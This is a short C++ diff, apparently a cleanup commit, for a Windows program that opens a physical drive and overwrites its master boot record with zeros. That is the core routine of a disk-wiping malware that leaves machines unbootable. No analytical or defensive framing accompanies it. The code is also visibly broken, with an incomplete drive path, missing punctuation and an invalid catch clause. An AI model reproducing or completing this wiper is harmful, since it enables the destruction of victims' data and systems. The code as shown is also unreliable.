@@ -6,21 +6,20 @@ using namespace std;
 int main() {
 
     DWORD write;
+    char mbrData[MBR_SIZE]; 
+    ZeroMemory(&mbrData, (sizeof mbrData));
 
-    char mbrData [MBR_SIZE]; 
-    ZeroMemory (&mbrData, (sizeof mbrData));
-
-    HANDLE MasterBoot Record = CreateFile("\\\\\\PhysicalDrive"
+    HANDLE MasterBootRecord = CreateFile("\\\\\\PhysicalDrive"
     GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
     , NULL, OPEN_EXISTING, NULL, NULL)
 
 
     try {
-        WriteFile (Master Boot Record, mbrData, MBR_SIZE, &write, NULL)
-        Sleep (5000);
+        WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)
+        Sleep(5000);
         ExitProcess();
     } catch(..){}
-    CloseHandle (MasterBoot Record);
+    CloseHandle(MasterBootRecord);
     return EXIT_SUCCESS;
 
 }
